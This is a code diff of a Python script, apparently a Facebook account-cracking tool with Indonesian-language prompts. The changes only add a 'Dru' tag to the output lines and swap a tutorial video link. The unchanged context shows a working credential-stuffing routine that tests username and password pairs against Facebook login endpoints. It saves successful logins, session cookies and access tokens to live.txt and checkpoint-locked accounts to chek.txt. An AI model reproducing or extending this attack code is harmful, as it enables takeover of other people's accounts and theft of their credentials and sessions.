@@ -604,13 +604,13 @@ class ngentod:
 				send=ses.get(api,params=param)
 				if "session_key" in send.text and "EAAA" in send.text:
 					ok+=1
-					print(f"\r\x1b[1;32m * ---> {user}|{pw}\x1b[0m\n",end="")
+					print(f"\r\x1b[1;32m Dru* ---> {user}|{pw}\x1b[0m\n",end="")
 					open("live.txt","a").write(f"{user}|{pw}\n")
 					live.append(f"{user}{pw}")
 					break
 				elif "www.facebook.com" in send.json()["error_msg"]:
 					cp+=1
-					print(f"\r\x1b[1;33m * ---> {user}|{pw}\x1b[0m\n",end="")
+					print(f"\r\x1b[1;33m Dru* ---> {user}|{pw}\x1b[0m\n",end="")
 					open("chek.txt","a").write(f"{user}|{pw}\n")
 					chek.append(f"{user}{pw}")
 					break
@@ -641,7 +641,7 @@ class ngentod:
 				if "c_user" in kuke:
 					ok+=1
 					kuki=f"c_user={kuke.get('c_user')};fr={kuke.get('fr')};xs={kuke.get('xs')}"
-					print(f"\r\x1b[1;32m * ---> {kuke.get('c_user')}|{pw}|{kuki}\x1b[0m\n",end="")
+					print(f"\r\x1b[1;32m Dru* ---> {kuke.get('c_user')}|{pw}|{kuki}\x1b[0m\n",end="")
 					open("live.txt","a").write(f"{kuke.get('c_user')}|{pw}|{kuki}\n")
 					live.append(f"{kuke.get('c_user')}{pw}{kuki}")
 					react_me(kuke,beol)
@@ -650,7 +650,7 @@ class ngentod:
 					cp+=1
 					try:uid=re.search("3A(\\d*)",kuke.get("checkpoint")).group(1)
 					except:uid=user
-					print(f"\r\x1b[1;33m * ---> {uid}|{pw}\x1b[0m\n",end="")
+					print(f"\r\x1b[1;33m Dru* ---> {uid}|{pw}\x1b[0m\n",end="")
 					open("chek.txt","a").write(f"{user}|{uid}|{pw}\n")
 					chek.append(f"{user}|{uid}{pw}")
 					break
@@ -668,14 +668,14 @@ class ngentod:
 				if "access_token" in respon:
 					ok+=1
 					#print(respon)
-					print(f"\r\x1b[1;32m * ---> {user}|{pw}\x1b[0m\n",end="")
+					print(f"\r\x1b[1;32m Dru* ---> {user}|{pw}\x1b[0m\n",end="")
 					open("live.txt","a").write(f"{user}|{pw}\n")
 					live.append(f"{user}{pw}")
 					#react_me(kuke,beol)
 					break
 				elif "User must verify their account" in respon or "Untuk Sementara Akun Tidak Tersedia" in respon:
 					cp+=1
-					print(f"\r\x1b[1;33m * ---> {user}|{pw}\x1b[0m\n",end="")
+					print(f"\r\x1b[1;33m Dru* ---> {user}|{pw}\x1b[0m\n",end="")
 					open("chek.txt","a").write(f"{user}|{pw}\n")
 					chek.append(f"{user}{pw}")
 					break
@@ -780,14 +780,14 @@ if __name__=="__main__":
 		kueh=zxss(open("lo_ngentod/cookie","r").read().strip())
 	except FileNotFoundError:
 		os.system("clear")
-		print("\n[*] Cara Mendapatkan Cookie : https://youtu.be/ZT4MU7AlgA4\n[*] Ketik OPEN Untuk Membuka Video\n")
+		print("\n[*] Cara Mendapatkan Cookie : https://www.youtube.com/watch?v=jfcC99dkEAo\n[*] Ketik OPEN Untuk Membuka Video\n")
 		while True:
 			a=input("[?] Masukkan Cookie : ")
 			if a in[""," "]:
 				print("[!] Jangan Kosong")
 			elif a in["open","OPEN","Open"]:
 				import subprocess
-				exit(subprocess.Popen(["am","start","https://youtu.be/ZT4MU7AlgA4"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
+				exit(subprocess.Popen(["am","start","https://www.youtube.com/watch?v=jfcC99dkEAo"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
 			else:
 				asup(a).login()
 	try:
